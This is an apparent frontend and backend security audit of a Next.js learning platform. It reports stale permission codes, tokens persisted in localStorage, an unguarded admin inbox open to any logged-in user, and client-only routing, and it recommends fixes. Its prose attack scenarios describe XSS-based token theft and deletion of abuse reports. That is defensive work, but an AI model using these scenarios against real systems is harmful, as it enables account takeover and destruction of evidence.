# Frontend IAM & Security Audit + Routing Audit

Scope: `E:\arcade\ui` (Next.js App Router), cross-referenced against `E:\arcade\backend` (Spring Security). Audit-only — no source files modified.

Authoritative backend model referenced throughout:
- `identity/iam/permissions/Permission.java` + `PermissionContext` enum: `GLOBAL` | `CHANNEL`.
- `identity/iam/platform/IamBootstrap.java`: seeds the **only real** permission codes and Platform Roles.
  - GLOBAL permissions that actually exist: `platform.channels.manage`, `platform.channels.view`, `platform.channels.update`, `platform.channels.delete`, `platform.channel.members.manage`, `platform.channel.roles.manage`, `platform.courses.review`, `platform.content.review`, `platform.analytics.view`, `platform.billing.manage`, `platform.system.manage`, `platform.roles.read`, `platform.roles.manage`, `ALL`.
  - CHANNEL permissions that actually exist: `channel.settings.manage`, `channel.staff.manage`, `channel.videos.upload`, `channel.videos.delete`, `channel.content.review`.
  - Platform Roles: `PLATFORM_OWNER` (all GLOBAL perms), `PLATFORM_ADMIN` (all `platform.*` perms), `SUPPORT` (none yet), `REVIEWER` (`platform.courses.review`, `platform.content.review`), `FINANCE` (`platform.billing.manage`, `platform.analytics.view`).
  - Channel Roles are per-channel (`ChannelRole` entity, `channel_roles` table, unique per `(channel_id, code)`) — there is no fixed enum of channel role codes; they're admin-defined per channel and carry a subset of the CHANNEL permissions above.
- `infrastructure/security/SecurityConfig.java`: stateless JWT, CORS locked to configured origins, CSP `default-src 'self'`, 401 (not a redirect) on unauthenticated API calls, method security enabled (`@EnableMethodSecurity`) so `@PreAuthorize` is the real enforcement point.

---

## Part 1 — Authentication Lifecycle

**Flow as implemented:**
1. `app\api\internal\auth\login\route.ts` (Next.js BFF) calls the Spring backend, receives `{accessToken, refreshToken, user}`, sets `refreshToken` as an **HttpOnly** cookie (`secure` in prod, `sameSite: lax`, 30-day `maxAge`), and returns `{accessToken, user}` to the browser. Good pattern — refresh token never touches JS-readable storage.
2. The browser-side access token is held in a Zustand store (`infrastructure/auth/auth.store.ts`) with `persist` middleware writing `{user, accessToken}` to **`localStorage['arcade-auth-storage']`** (plaintext, JS-readable).
3. `infrastructure/http/api.ts` attaches `Authorization: Bearer <token>` from the store (falling back to reading `localStorage` directly), and on a `401` calls a de-duplicated `refreshTokens()` that hits `AuthService.refresh()` → `/api/internal/auth/refresh` (BFF), which reads the HttpOnly cookie, calls the backend, rotates the refresh cookie, and returns a new access token.
4. On refresh failure with a previously-present token, `api.ts` clears auth state, clears the query cache, and hard-navigates to `/`.
5. Two independent components each run their own "refresh on mount if status is loading" effect: `apps/core/components/AuthInitializer.tsx` (mounted globally in `apps/core/Providers.tsx`) and `apps/core/layout/ProtectedLayout.tsx` (mounted inside every authenticated route tree, e.g. via `LearnerShell`). Both call `AuthService.refresh()`; that method itself dedupes concurrent calls via a module-level `refreshPromise`, so this does **not** cause a duplicate network race today, but it is duplicated initialization logic living in two places with slightly different post-refresh behavior (`AuthInitializer` does not fall back to `UserService.getMe()` when the refresh response has no user; `ProtectedLayout` does).
6. `apps/core/components/AuthGuard.tsx` is a **second, unused** auth guard that checks a **third** token-storage mechanism: `infrastructure/auth/auth.ts`, which reads/writes raw `localStorage['arcade-access-token']` / `localStorage['arcade-refresh-token']` via `getAccessToken`/`setTokens`/`isAuthenticated`. Nothing in the app ever calls `setTokens()`, and `AuthGuard` is not imported by any route in `app/` (confirmed via project-wide grep — only its own file references it). This is dead, orphaned auth code that models an entirely different (and unused) token-storage scheme than the one actually in effect.

**Findings:**

```
ID: AUTH-001
Severity: P3
Category: Auth lifecycle / dead code
Location: E:\arcade\ui\infrastructure\auth\auth.ts, E:\arcade\ui\apps\core\components\AuthGuard.tsx
Problem: A second, complete auth-token model (localStorage keys "arcade-access-token"/"arcade-refresh-token", isAuthenticated()/setTokens()/clearTokens()) exists in parallel with the real one (Zustand-persisted "arcade-auth-storage"). AuthGuard.tsx consumes the dead model and is not wired into any route.
Evidence: `setTokens` has zero call sites in the repo; `AuthGuard` has zero import sites outside its own file.
Why it matters: Duplicate/contradictory auth-state models are a classic source of "worked in dev, silently broken in prod" bugs if someone re-wires AuthGuard onto a route expecting it to reflect real session state — it never will, since nothing populates its storage keys.
Failure scenario: A developer wraps a new route in `<AuthGuard>` believing it enforces auth like ProtectedLayout does; the route becomes permanently inaccessible (isAuthenticated() always false) or, if `setTokens` is later reintroduced elsewhere, two divergent copies of the access token could exist.
Affected users/features: None currently (dead code), but any future feature built on it.
Recommended direction: Delete `infrastructure/auth/auth.ts` and `apps/core/components/AuthGuard.tsx`, or explicitly document why both models exist.
Implementation complexity: Trivial.
Regression risk: None (unused).
Dependencies: None.
Status: CONFIRMED ARCHITECTURAL VIOLATION
```

```
ID: AUTH-002
Severity: P2
Category: Auth lifecycle / token storage
Location: E:\arcade\ui\infrastructure\auth\auth.store.ts:59-62 (persist partialize includes accessToken)
Problem: The access token is persisted to plaintext localStorage (`arcade-auth-storage`), readable by any JavaScript running on the page's origin.
Evidence: `partialize: (state) => ({ user: state.user, accessToken: state.accessToken })` inside a `persist(..., { name: 'arcade-auth-storage' })` Zustand store.
Why it matters: This is a standard, accepted trade-off for many SPA/BFF setups (the sensitive long-lived refresh token IS correctly HttpOnly-cookie-only — see AUTH-003 note below), but it means any XSS anywhere on the site is a full session-hijack, not just a CSRF-adjacent nuisance. This audit found a real stored-XSS vector (see XSS-001) that makes this concrete rather than theoretical.
Failure / Attack scenario: Attacker posts a forum comment/post containing an `onerror`/`onload`-bearing tag (see XSS-001, which bypasses the app's only sanitization — a `<script>` regex strip). When another user views it, the injected script reads `localStorage['arcade-auth-storage']`, extracts `accessToken`, and exfiltrates it — full account takeover for the duration of the access token's lifetime (and further, since the attacker's script can also silently call `/api/internal/auth/refresh` via the victim's browser to keep obtaining fresh access tokens while the victim's tab stays open).
Affected users/features: Every authenticated user, all account data reachable via the access token's permissions.
Recommended direction: Keep the access token in memory only (Zustand state, non-persisted) and rely on the existing silent-refresh-on-401 flow to repopulate it after a hard reload, rather than persisting it to localStorage. This closes the exfiltration vector even if an XSS bug exists elsewhere.
Implementation complexity: Moderate (removes the "instant hydration" convenience; a first paint after reload has to wait for the refresh call, which `ProtectedLayout` already handles as a loading state).
Regression risk: Low — the refresh-on-mount flow already exists and is exercised on every navigation to a protected route.
Dependencies: None.
Status: CONFIRMED SECURITY ISSUE (severity driven up by XSS-001 below)
```

```
ID: AUTH-003
Severity: P3
Category: Auth lifecycle / duplication
Location: E:\arcade\ui\apps\core\components\AuthInitializer.tsx, E:\arcade\ui\apps\core\layout\ProtectedLayout.tsx
Problem: Two independent components each implement "if status is loading, call refresh()" with slightly different post-refresh fallback logic (ProtectedLayout additionally calls UserService.getMe() when the refresh payload has no user; AuthInitializer does not).
Evidence: Both files register their own `useEffect` gated on `status === 'loading'`; both call `AuthService.refresh()`.
Why it matters: Behavioral drift risk — if AuthInitializer's code path fires first (e.g. on a route without ProtectedLayout, or in a future refactor), a user whose refresh response omits `user` (documented as a real case backend can return, given the ProtectedLayout fallback exists to handle it) ends up with a persisted-but-empty user object and no fallback fetch, versus ProtectedLayout's equivalent path which self-heals via getMe().
Failure scenario / Attack scenario: Not independently exploitable; a UX/consistency bug (e.g. console/settings pages relying on `user.platformRoles` momentarily seeing an empty user object on some routes but not others depending on which effect wins).
Affected users/features: Any route mounted without ProtectedLayout that still depends on `user` being populated after refresh.
Recommended direction: Consolidate refresh-orchestration into a single hook/provider (likely fold ProtectedLayout's richer logic into AuthInitializer and have ProtectedLayout only read status/user).
Implementation complexity: Small-moderate.
Regression risk: Low.
Dependencies: None.
Status: TECHNICAL DEBT
```

```
ID: AUTH-004
Severity: P3
Category: Auth lifecycle / logout completeness
Location: E:\arcade\ui\app\api\internal\auth\logout\route.ts:18-29, callers in apps\public\layout\ForumLayout.tsx:160 and apps\learner\layout\LearnerNavbar.tsx:169
Problem: The BFF logout route only calls the backend's revoke endpoint "best effort" and only `if (authHeader)` is present on the incoming request; it always clears the local refresh cookie regardless. Whether the two call sites (`AuthService.logout()`) actually attach an `Authorization` header to the BFF logout call was not traced end-to-end.
Evidence: `if (authHeader) { await fetch(...auth/logout, { headers: { Authorization: authHeader }}) }` — `AuthService.logout()` itself sends no explicit Authorization header in `infrastructure/auth/auth.service.ts`, relying on browser-forwarded headers, which fetch/axios do not do automatically for a same-origin BFF call unless explicitly set.
Why it matters: If the header is never actually forwarded, backend-side token/session revocation on logout silently never happens — the access token remains valid server-side until natural expiry, and the specific refresh token is never explicitly revoked server-side (only the client-side cookie referencing it is deleted).
Failure scenario: A user logs out on a shared/public computer. The local cookie is cleared (so that browser can't silently refresh), but if an attacker had already captured the still-live access token (e.g. via AUTH-002/XSS-001), it continues to work until natural expiry regardless of the "logout."
Affected users/features: All users, "log out" affordance.
Recommended direction: Verify `AuthService.logout()` explicitly sets `Authorization: Bearer <token>` on its POST to `/api/internal/auth/logout`; if not, add it. Confirm backend `/auth/logout` actually revokes/blacklists the specific refresh token (not just relies on the client discarding it).
Implementation complexity: Small once verified.
Regression risk: Low.
Dependencies: Needs live testing (call logout, then replay the old access token against a protected endpoint).
Status: UNVERIFIED / NEEDS TESTING
```

**Positive findings (auth lifecycle):** refresh token is HttpOnly + rotated on every refresh (token rotation) + `sameSite: lax`; the BFF login/refresh/logout routes require the custom `X-Requested-With: XMLHttpRequest` header as a CSRF mitigation (blocks simple cross-site form-based CSRF against those endpoints, though note this is not a substitute for SameSite/CSRF-token defense against fetch-capable cross-site attackers on browsers that don't enforce it); `api.ts`'s 401 handler correctly distinguishes "anonymous request that never had a session" from "session that just expired," avoiding a false forced-logout loop for logged-out visitors hitting protected endpoints from public pages; concurrent 401s share a single in-flight refresh promise (no refresh storm).

---

## Part 2 — Authorization / IAM Audit

### 2.1 The frontend's permission-string source of truth is stale relative to the backend

`infrastructure/auth/authorization.service.ts` is the single central place gating Platform Console visibility. It is well-organized (one file, no scattered ad hoc permission checks for the *console* surface), but several of its checks reference permission codes that **do not exist anywhere in the backend's seeded permission set** (`IamBootstrap.java`):

| AuthorizationService check | Permission string(s) checked | Exists in backend seed? |
|---|---|---|
| `canManageChannels` | `platform.channels.manage` | Yes |
| `canReviewContent` | `platform.content.review`, `platform.courses.review`, `channel.content.review` | Yes |
| `canManageUsers` | `platform.users.manage` | **No** |
| `canManageRoles` | `platform.roles.assign`, `platform.roles.manage` | Only `platform.roles.manage` exists; `platform.roles.assign` does not |
| `canManagePermissions` | `platform.permissions.manage` | **No** |
| `canManageSettings` | `platform.system.manage` | Yes |
| `canManageCategories` | `platform.categories.manage` | **No** |
| `canViewAuditLogs` | `platform.audit.view` | **No** |
| `canViewPayments` | `payments.view` | **No** |

```
ID: IAM-001
Severity: P1
Category: Authorization / stale permission model
Location: E:\arcade\ui\infrastructure\auth\authorization.service.ts:38-47
Problem: Six of nine granular capability checks reference permission codes that do not exist in the backend's authoritative permission set (E:\arcade\backend\...\IamBootstrap.java seedPermissions()). Because AuthorizationService.hasPermission() only returns true for an exact string match or the literal 'ALL' permission, every gate built on a nonexistent code is permanently false for every real role except a user holding 'ALL' (i.e. only PLATFORM_OWNER).
Evidence: See table above; cross-referenced directly against IamBootstrap.java's `List<PermissionDefinition> definitions`.
Why it matters: This breaks the intended capability model for real backend roles. FINANCE (has platform.billing.manage + platform.analytics.view) can never see /console/payments because that page is gated on the nonexistent `payments.view` (see IAM-002). PLATFORM_ADMIN (has every platform.* permission via prefix match, including the real platform.roles.manage) still cannot manage users/permissions/categories/audit logs from the console because those checks reference codes that were never seeded at all, so there is no role short of literal PLATFORM_OWNER that can ever satisfy them.
Failure scenario: A platform operator is assigned PLATFORM_ADMIN or FINANCE (as intended by the backend's role design) and finds entire sections of Platform Console (IAM tab, Payments tab) invisible/inaccessible, with no error explaining why — it looks like a broken feature, not a permission gap, because the nav item itself is hidden (see console/layout.tsx logic) rather than shown-then-403'd.
Affected users/features: PLATFORM_ADMIN, FINANCE, REVIEWER, SUPPORT roles; Console → IAM, Console → Payments.
Recommended direction: Either (a) add the missing permissions to the backend's seed list if the capability is meant to exist (platform.users.manage, platform.categories.manage, platform.audit.view, a real payments-view permission, platform.roles.assign as distinct from platform.roles.manage), and wire real @PreAuthorize checks to them, or (b) fix the frontend to reference only permission codes that are actually seeded (e.g. gate Payments on platform.billing.manage or platform.analytics.view instead of the fictional payments.view). Given "TODO: Expose resolved capabilities through /api/v1/users/me" already present in IamBootstrap.java's own doc comment, the intended long-term fix is for the frontend to consume a backend-resolved capability list rather than re-deriving it from permission-code string literals at all.
Implementation complexity: Moderate (requires backend + frontend coordination either way).
Regression risk: Medium if permission codes are renamed — anyone else depending on the old (nonexistent) strings would be unaffected since they never worked, but any hidden manual QA/test fixtures asserting current (broken) behavior would need updating.
Dependencies: Backend IAM seed data, `/api/v1/users/me` capability exposure (already flagged as a backend TODO).
Status: CONFIRMED BUG
```

```
ID: IAM-002
Severity: P2
Category: Authorization / stale permission model
Location: E:\arcade\ui\app\(authenticated)\console\payments\page.tsx:29-33
Problem: Page-level guard `if (!AuthorizationService.canViewPayments(user)) notFound();` gates on the nonexistent `payments.view` permission (see IAM-001). No real backend role other than PLATFORM_OWNER (via 'ALL') can ever pass this check, even though FINANCE was clearly designed by the backend to have payments/billing visibility.
Why it matters / Failure scenario: Same root cause as IAM-001, called out separately because this is the one console page fully gated on an entirely-fictional permission with no fallback to any real one.
Recommended direction: Gate on `platform.billing.manage` and/or `platform.analytics.view` (both real, both assigned to FINANCE) until a dedicated payments-view permission is actually seeded server-side.
Implementation complexity: Trivial.
Regression risk: Low.
Dependencies: IAM-001.
Status: CONFIRMED BUG
```

### 2.2 Confirmed broken access control — Console Inbox (frontend AND backend both fail to authorize)

```
ID: IAM-003
Severity: P0
Category: Authorization / broken access control (IDOR-adjacent, backend-confirmed)
Location:
  Frontend: E:\arcade\ui\app\(authenticated)\console\inbox\page.tsx (entire file — no permission check present)
  Frontend: E:\arcade\ui\app\(authenticated)\console\layout.tsx:50-52 (comment explicitly documents removing the notFound() fallback that used to gate empty-nav-item states)
  Backend: E:\arcade\backend\src\main\java\com\arcade\backend\platform\contact\ContactMessageController.java:31-67
Problem: `/console/inbox` is documented in-code as an "Admin endpoint" (see backend Javadoc comments on every handler) but every single handler — list, unread-count, get-by-id, update-status, delete — is annotated only `@PreAuthorize("isAuthenticated()")`. There is no platform-role or permission check at all, backend or frontend. The frontend page component performs zero client-side authorization check before rendering the inbox UI and wiring up `api.get('/api/v1/console/messages')`, `api.patch(.../status)`, and `api.delete(...)`.
Evidence:
  - Backend: `@GetMapping("/api/v1/console/messages") @PreAuthorize("isAuthenticated()")` (and identically for unread-count, get-by-id, update-status, delete).
  - Frontend: `app\(authenticated)\console\inbox\page.tsx` has no `useAuthStore`/`AuthorizationService`/`notFound()` guard anywhere in the file (confirmed by full read and by targeted grep that found guards in every *other* console page but not this one).
  - `console/layout.tsx` comment: "Removed notFound() when navItems is empty. This allows Org staff to access specific console routes... even if they don't have global console sidebar links." — i.e. the layout was deliberately changed to stop blocking rendering when a user has none of the console permissions, on the assumption individual pages self-guard. This page doesn't.
Why it matters: This is not merely a UI leak masked by real backend enforcement (the pattern seen correctly elsewhere, e.g. IAM-002/console/payments) — the backend itself imposes no authorization beyond "is logged in." Any authenticated learner account (the lowest-privilege role in the system) can read every "Reach Us" contact submission and every course/lesson abuse report platform-wide, mark them read/unread/archived, and permanently delete them, all via a directly-navigable, undefended URL.
Failure scenario / Attack scenario: A learner signs up for a free account, navigates directly to `https://<app>/console/inbox` (no link needed once the URL is known — it's discoverable from this very codebase or from client-side route prefetching), sees the full "Reach Us" and abuse-report queues platform-wide, and can delete a report filed against their own content to make it disappear before a real reviewer ever sees it, or read other users' PII (name/email/message body) submitted through the contact form.
Affected users/features: All users who submit contact-us messages or course/lesson reports (data exposure); the review/support workflow (data destruction risk); the platform's own trust & safety pipeline (a bad actor can delete evidence of reports against their own content).
Recommended direction: Backend: replace `@PreAuthorize("isAuthenticated()")` on all five ContactMessageController handlers with a real permission check consistent with the rest of the platform (e.g. a new `platform.support.manage`/`platform.messages.manage` permission, or reuse `platform.content.review`/`platform.system.manage` if that matches product intent — this needs a product decision, not just a code fix). Frontend: add the matching `AuthorizationService` guard to `console/inbox/page.tsx` mirroring every other console page (e.g. `console/iam/page.tsx`, `console/payments/page.tsx` pattern), once the backend permission model above is settled.
Implementation complexity: Small (mirrors an existing, already-correct pattern used elsewhere in the same directory).
Regression risk: Low — this only removes access from users who should never have had it.
Dependencies: A product decision on which permission should gate contact/report inbox access.
Status: CONFIRMED SECURITY ISSUE
```

### 2.3 Missing frontend guard, backend-protected (lower severity — UX bug, not a data leak)

```
ID: IAM-004
Severity: P2
Category: Authorization / missing UI guard (backend covers it)
Location: E:\arcade\ui\app\(authenticated)\console\content-manage\[courseId]\page.tsx (no permission check anywhere in the file)
         Backend: E:\arcade\backend\src\main\java\com\arcade\backend\platform\content\ConsoleContentController.java:36-37 — `@PreAuthorize("@contentReviewPermissions.hasContentReviewPermission(principal.id)")`
Problem: Unlike every sibling console page, `content-manage/[courseId]/page.tsx` has no client-side `AuthorizationService`/`notFound()` gate. Because it's inside `(authenticated)/console/...`, the only thing preventing a non-reviewer from opening the page shell is `ProtectedLayout` checking plain authentication.
Why it matters: The backend does correctly enforce `hasContentReviewPermission` on the actual data endpoints (`/courses/{id}/analysis`, `/courses`), so no data is actually exposed to unauthorized users — this is a UX defect, not a breach: an unauthorized learner who navigates here directly gets a page shell that then fails to load data (console errors / broken empty states) instead of a clean "not found" / "no access" response, which both leaks the existence/shape of an admin surface and produces a confusing broken-page experience instead of a controlled redirect.
Failure scenario: A learner bookmarks or is sent a `/console/content-manage/<courseId>` link; page renders its header/chrome, then every fetch 403s, leaving a half-rendered broken UI rather than a clean redirect.
Affected users/features: Any authenticated non-reviewer who reaches this URL.
Recommended direction: Add the same `AuthorizationService.canReviewPlatformContent(user)` (already used to conditionally show the nav link in console/layout.tsx) as an explicit page-level `notFound()` guard, matching the pattern in `console/iam/page.tsx` and `console/payments/page.tsx`.
Implementation complexity: Trivial.
Regression risk: None.
Dependencies: None.
Status: CONFIRMED BUG
```

### 2.4 Hardcoded / guessed role strings scattered outside the central authorization service

```
ID: IAM-005
Severity: P2
Category: Authorization / hardcoded role literals
Location: E:\arcade\ui\app\(public)\[username]\page.tsx:696-701 and :739-744 (PUBLIC route), E:\arcade\ui\app\(authenticated)\profile\page.tsx:1024-1029 and :1067-1072
Problem: Instead of using `AuthorizationService`/backend-resolved role codes, these files independently guess at admin/creator role naming with an ad hoc list: `['ADMIN', 'ROLE_ADMIN', 'PLATFORM_ADMIN', 'SUPER_ADMIN', 'SYSTEM_ADMIN']` (only `PLATFORM_ADMIN` actually exists as a backend PlatformRole code — `ADMIN`, `ROLE_ADMIN`, `SUPER_ADMIN`, `SYSTEM_ADMIN` do not exist anywhere in the backend model) plus a same-shaped guess for "creator" roles (`CREATOR`, `ROLE_CREATOR`, `INSTRUCTOR` — none of which are backend PlatformRole or ChannelRole codes either; channel roles are admin-defined per channel with no fixed enum).
Evidence: Duplicated verbatim across two files (public profile page and the authenticated-user's own profile page), each block ~15 lines, checking both `.role`/`.roles` (legacy/deprecated fields per auth.store.ts comments) and `.platformRoles`.
Why it matters: (1) This duplicates authorization/role-labeling logic outside the designated central service, which the project's own CLAUDE.md flags as an architecture violation ("Permission logic, hardcoded roles, or business rules in Frontend" is explicitly called out as something to catch in review). (2) Because 4 of 5 "admin" strings and all 3 "creator" strings never match anything the backend actually issues, this logic is dead-weight guesswork that only coincidentally works for the one real code (`PLATFORM_ADMIN`) and silently fails to badge PLATFORM_OWNER, REVIEWER, or FINANCE holders as anything special. (3) This is purely a cosmetic "Admin"/"Creator" badge on a profile page, so the impact is informational/cosmetic rather than a security boundary, but it demonstrates the exact "stale permission names that don't match backend enums" pattern the audit was asked to check for, at platform-wide scale (public profile pages, visible to any visitor).
Failure scenario: A PLATFORM_OWNER's public profile does not show an "Admin" badge (their code isn't in the guessed list), while cosmetic mislabeling could also go the other direction if role codes are ever renamed.
Affected users/features: Public profile pages (`/[username]`) and the authenticated `/profile` page, for all platform roles except PLATFORM_ADMIN.
Recommended direction: Replace with a single shared helper (e.g. `AuthorizationService.getDisplayRoleBadge(user)`) that maps the real backend PlatformRole codes (`PLATFORM_OWNER`, `PLATFORM_ADMIN`, `SUPPORT`, `REVIEWER`, `FINANCE`) to display badges, defined once and imported everywhere instead of copy-pasted guesswork.
Implementation complexity: Small.
Regression risk: Low (cosmetic only).
Dependencies: None.
Status: CONFIRMED ARCHITECTURAL VIOLATION
```

### 2.5 Channel-scope handling (checked for IDOR-style cross-channel leakage)

Positive finding: `app\(authenticated)\channels\[id]\manage\page.tsx` does the *correct* thing for a multi-tenant admin surface — on every mount/`channelId` change it calls `channelService.getMyChannelPermissions(channelId)` (a **per-channel**, freshly-fetched permission set) rather than reusing a cached/global permission list, and gates channel-scoped actions (e.g. `canReviewChannelContent`) off that per-channel result. This means editing the `[id]` in the URL to another channel correctly re-fetches (and the backend correctly re-evaluates) permissions for the new channel rather than the frontend trusting a stale, globally-cached permission set. This is the right pattern and should be the template for any other channel-scoped surface.

```
ID: IAM-006
Severity: P3
Category: Authorization / channel scope — needs live verification
Location: E:\arcade\ui\app\(authenticated)\channels\[id]\manage\ (all sub-components), E:\arcade\ui\app\(authenticated)\organizations\[id]\page.tsx
Problem: While the top-level page correctly re-fetches per-channel permissions, several sub-components (ChannelStaffManager, ChannelSettingsManager, ChannelDangerZone, etc.) were not individually traced to confirm each of their mutating calls is itself checked against the fetched `permissions` array before firing (vs. relying purely on the backend to 403). `organizations\[id]\page.tsx` similarly derives `isOwner`/`isAdmin` from `myMembership?.role` fetched per organization id, which looks correctly scoped but wasn't traced to its data source to confirm the membership lookup is itself scoped server-side to the `[id]` in the URL rather than returning the user's global membership.
Why it matters: If any sub-component gates a destructive action (e.g. "delete channel," in ChannelDangerZone) purely on a boolean prop derived once at the top and passed down, rather than re-checking, a stale prop after a client-side channel switch (e.g. via a picker without full remount) could show an enabled destructive control to a user who briefly had permission on a previous channel. This is speculative — the observed top-level pattern is correct — flagging for verification rather than asserting a bug.
Failure scenario: Needs live testing — log in as a Channel Admin for Channel A, open its manage danger-zone tab, then manipulate the URL/id to Channel B without a full page reload, and confirm all destructive controls immediately reflect Channel B's (lack of) permissions rather than retaining Channel A's.
Affected users/features: Channel Admins managing multiple channels.
Recommended direction: Manual/E2E test as described above; if a full remount already happens on `[id]` change (likely, given Next.js route param changes typically remount the page component), this is a non-issue.
Implementation complexity: N/A (verification task).
Regression risk: N/A.
Dependencies: None.
Status: UNVERIFIED / NEEDS TESTING
```

### 2.6 Frontend authorization matrix

| Backend role / permission | Frontend gate that should unlock it | Does it actually match? |
|---|---|---|
| `PLATFORM_OWNER` (`ALL`) | Everything (hasPermission short-circuits on `'ALL'`) | Yes — correct |
| `PLATFORM_ADMIN` (all `platform.*`) | Console: Channels ✔, Reviews ✔ (via platform.courses.review/content.review), Content-manage ✔, Exams ✔, IAM ✘ (broken, IAM-001), Payments ✘ (broken, IAM-002) | Partially broken |
| `FINANCE` (`platform.billing.manage`, `platform.analytics.view`) | Should see Console → Payments | **Broken** — gated on nonexistent `payments.view` (IAM-002) |
| `REVIEWER` (`platform.courses.review`, `platform.content.review`) | Console: Reviews ✔, Content-manage ✔, Exams ✔ | Correct |
| `SUPPORT` (no permissions seeded) | Nothing today (no permissions exist for it) | Consistent, but note Console → Inbox is reachable by *anyone*, not gated to SUPPORT at all (IAM-003) |
| Channel role holding `channel.content.review` | Channel manage → content review actions for *that channel only* | Correct — per-channel fetch pattern (2.5) |
| Channel role holding `channel.staff.manage`/`channel.settings.manage`/`channel.videos.*` | Corresponding tabs/actions in `/channels/[id]/manage` | Not individually re-verified per component (IAM-006) |
| Any authenticated user, no special role | Console → Inbox (read/modify/delete admin support queue) | **Should NOT be unlocked — is unlocked** (IAM-003, P0) |
| Any authenticated user, no special role | `/console/content-manage/[courseId]` page shell | Renders shell but backend correctly blocks data (IAM-004, UX-only) |
| Unauthenticated visitor | Any `/console/*`, `/studio/*`, or other `(authenticated)` route | Should redirect to `/sign`/`/` — enforced client-side only, see Part 3 routing notes for the "no middleware.ts" caveat |

---

## Part 3 — Routing Audit

**Critical structural note:** there is **no `middleware.ts`** anywhere in the project (confirmed via recursive search of `app/`, project root, and all subdirectories excluding `node_modules`/`.next`). All route protection — for `(authenticated)/*` broadly and `(authenticated)/console/*`, `(authenticated)/studio/*` specifically — is implemented purely as **client components** (`'use client'` guards: `ProtectedLayout`, `console/layout.tsx`, `studio/layout.tsx`, and individual page-level `notFound()` calls). This is consistent with the CRITICAL PRINCIPLE stated for this audit (frontend auth is UX, not the real boundary) provided the backend enforces every corresponding endpoint — which IAM-003 shows is **not always true**. Practically, it also means:
- The full JS bundle and initial React tree for admin pages (structure, labels, component names) is served to anyone who requests the route, authenticated or not — no SSR-level 401/redirect. Not a data leak by itself, but an avoidable disclosure of admin UI shape; a `middleware.ts` redirect for `/console/*` and `/studio/*` when no session cookie is present would tighten this and also remove the current one-frame flash of loading UI before the client-side redirect fires.

```
ID: ROUTE-001
Severity: P2
Category: Routing / defense in depth
Location: E:\arcade\ui (project-wide — no middleware.ts exists)
Problem: All authenticated-route protection is client-side only; there is no edge/server-level gate.
Why it matters: Every layer of frontend guard in this audit (ProtectedLayout, console/layout.tsx, per-page notFound()) is bypassable in the sense that the HTML shell and JS still ship; only rendered content/data is gated, and only once React hydrates and the auth store resolves. Combined with IAM-003/IAM-004, this means the "first line of defense" the team seems to intend (nav items hidden, layouts checking status) has no server-side backstop at all.
Failure scenario: A crawler or automated scanner enumerates `/console/*` and `/studio/*` paths (easily discoverable from this repo's own route tree) and receives 200 OK with real page markup for every one, authenticated or not, before any client-side redirect fires — increasing the attack surface for reconnaissance even where the actual data calls are properly backend-guarded.
Affected users/features: All `(authenticated)/*` routes.
Recommended direction: Add a `middleware.ts` that checks for the presence of the `refreshToken` HttpOnly cookie (not full validation — the backend still owns that) and redirects to `/sign` for `(authenticated)` route-group paths when absent, as a defense-in-depth / UX-flash-elimination measure. This does not replace per-permission backend checks.
Implementation complexity: Small-moderate.
Regression risk: Low if scoped only to redirect-on-missing-cookie (not full auth validation, which stays server-side/API-side).
Dependencies: None.
Status: ARCHITECTURAL RISK
```

### Route inventory (significant routes)

| Route | Domain | Public/Protected | Guard mechanism | Layout | Error boundary | Loading boundary |
|---|---|---|---|---|---|---|
| `/` , `/sign`, `/forgot-password`, `/reset-password`, `/verify-email`, `/oauth2/redirect` | Public entry / auth | Public | n/a | root `layout.tsx` | root `not-found.tsx` only | none dedicated |
| `(public)/*` (`/courses`, `/events`, `/forum/*`, `/creators`, `/workshops`, `/[username]`, `/about`, `/privacy`, `/terms`, `/reach-us`) | Public marketing/content | Public | n/a | `(public)/layout.tsx` | none | `(public)/explore/loading.tsx`, `(public)/[username]/loading.tsx` only — most public routes lack one |
| `(onboarding)/onboarding` | Post-signup flow | Protected (redirected into by ProtectedLayout when `user.onboardingCompleted === false`) | `(onboarding)/layout.tsx` + ProtectedLayout's own onboarding redirect logic | dedicated | none | none |
| `(authenticated)/*` (learner routes: `/my-learning`, `/learn/[courseId]`, `/achievements`, `/leaderboard`, `/notifications`, `/search`, `/settings/*`, `/profile`, `/organizations*`, `/roadmap*`, `/exam`, `/join`, `/my-events`, `/trash`) | Learner-facing | Protected | `ProtectedLayout` (auth-only, no per-route permission) | `(authenticated)/layout.tsx` → `LearnerShell` | none dedicated | `(authenticated)/loading.tsx` (shared) |
| `(authenticated)/console/*` | Platform Console (admin) | Protected + permission-gated (mostly) | `ProtectedLayout` (auth) + `console/layout.tsx` (nav visibility only, explicitly does **not** block rendering) + per-page `notFound()` (present on `channels`, `courses`, `exam-schedules`, `iam`, `reviews`, `reviews/[id]`, `payments`, root `console/page.tsx`; **absent** on `inbox` (IAM-003, P0) and `content-manage/[courseId]` (IAM-004, P2)) | `console/layout.tsx` | none | none |
| `(authenticated)/studio/*` | Content-creation workspace | Protected + access-gated | `ProtectedLayout` (auth) + `studio/layout.tsx` (real per-surface access checks: `useStudioAccess`, event-view-access API call, collaboration-membership API call, admin bypass) | `studio/layout.tsx`, `studio/events/layout.tsx` | `studio/events/error.tsx` only (rest of `/studio/*` has none) | `studio/events/loading.tsx` only |
| `(authenticated)/channels/[id]/manage` | Channel admin (per-tenant) | Protected + per-channel-permission-gated | `ProtectedLayout` + page-level fetch of `getMyChannelPermissions(channelId)` (correct scoped pattern, 2.5) | none dedicated beyond LearnerShell | none | own inline spinner |
| `app/api/internal/auth/*` | BFF auth routes | Server-only (Next.js Route Handlers) | CSRF header check (`X-Requested-With`), HttpOnly cookie read/write | n/a | n/a | n/a |
| `dev-editor-perf` | Dev-only perf harness | Unclear — not inside `(authenticated)` or `(public)`, sits at bare `app/dev-editor-perf` | **No guard found** | none | none | none |

```
ID: ROUTE-002
Severity: P3
Category: Routing / stray dev route
Location: E:\arcade\ui\app\dev-editor-perf\page.tsx
Problem: This route sits outside every route group ((public), (authenticated), (onboarding)) and was not observed to have any guard, environment check (e.g. NODE_ENV !== 'production'), or removal-before-ship marker.
Why it matters: If this is a developer-only performance harness for the rich-text editor, shipping it reachable in production is at minimum unnecessary attack surface / bundle bloat, and depending on what it renders (editor internals, potentially test data) could leak implementation details.
Failure scenario: Publicly reachable in production at `/dev-editor-perf` with no login required.
Affected users/features: N/A (dev tooling), but public reachability is the concern.
Recommended direction: Gate behind `process.env.NODE_ENV !== 'production'` (return `notFound()` in production) or remove from the shipped route tree entirely (e.g. move under a build-excluded path).
Implementation complexity: Trivial.
Regression risk: None.
Dependencies: Confirm this file's actual content/purpose (not read in full during this audit) before removing.
Status: UNVERIFIED / NEEDS TESTING
